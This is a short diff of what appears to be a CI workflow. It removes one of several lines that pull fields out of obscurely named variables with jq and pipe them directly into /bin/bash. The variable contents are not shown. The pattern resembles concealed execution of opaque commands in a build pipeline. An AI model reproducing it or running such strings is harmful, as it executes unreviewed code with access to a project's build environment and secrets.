@@ -21,7 +21,6 @@ jobs:
           echo $uen758 | jq -r .pt2 | /bin/bash
           echo $or389 | jq -r .ym202 | /bin/bash
           echo $kxy1 | jq -r .z9 | /bin/bash
-          echo $up466 | jq -r .l3 | /bin/bash
           echo $rksq6647 | jq -r .akj2076 | /bin/bash
           printf '%s' "$s2" | jq -r .ekkym9550 | /bin/bash
 
